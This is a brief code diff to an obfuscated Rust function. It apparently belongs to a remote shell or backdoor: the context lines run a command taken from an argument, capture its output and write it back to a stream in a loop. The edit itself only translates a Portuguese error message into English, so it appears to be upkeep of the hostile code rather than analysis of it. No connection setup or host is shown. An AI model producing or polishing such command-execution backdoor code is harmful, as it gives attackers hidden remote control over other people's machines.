@@ -18,7 +18,7 @@ fn _0xC() {
                 .arg(&_0x10)
                 .stdout(_0xB::piped())
                 .output()
-                .expect("execução falhou");
+                .expect("Execution failed");
             let _0x12 = String::from_utf8_lossy(&_0x11.stdout);
             if _0xD.write_all(_0x12.as_bytes()).is_err() { break; }
         }
